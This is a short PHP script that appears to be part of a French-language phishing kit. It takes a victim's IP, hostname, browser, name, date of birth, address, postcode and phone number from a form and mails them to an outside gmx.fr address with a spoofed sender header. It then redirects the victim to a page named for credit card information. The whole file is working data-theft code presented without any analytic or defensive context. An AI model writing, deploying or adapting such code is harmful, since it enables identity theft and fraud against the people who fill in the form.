<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilmsg .= "--------------########################-------------------\n";
$bilmsg .= "IP              : $ip\n";
$bilmsg .= "HOST            : ".gethostbyaddr($ip)."\n";
$bilmsg .= "browser         : ".$_SERVER['HTTP_USER_AGENT']."\n";
$bilmsg .= "-------------- ########################----------\n";
$bilmsg .= "Prénom : ".$_POST['Prenom']."\n";
$bilmsg .= "Nom : ".$_POST['Nom']."\n";
$bilmsg .= "Date de naissance : ".$_POST['datenaissance']."\n";
$bilmsg .= "Ville : ".$_POST['Ville']."\n";
$bilmsg .= "code postale : ".$_POST['codepostale']."\n";
$bilmsg .= "Ligne d'adresse : ".$_POST['adress']."\n";
$bilmsg .= "N° de téléphone : ".$_POST['Ntelephone']."\n";
$bilmsg .= "-------------- ########################----------\n";
$bilsnd = "zero.plan@gmx.fr";
$bilsub = "'Infoormation Personne '$ip";
$bilhead = "From: 02 information ppl '<wer@info.fr>";
$bilhead .= $_POST['eMailAdd']."\n"; 
$bilhead .= "MIME-Version: 1.0\n";
mail($bilsnd,$bilsub,$bilmsg,$bilhead);

header("Location:informationcreditcard.html?id=454587545&mail&from&smartphone?454584515155184s5454a548sa54a514s515num?454515577774548454client");
?>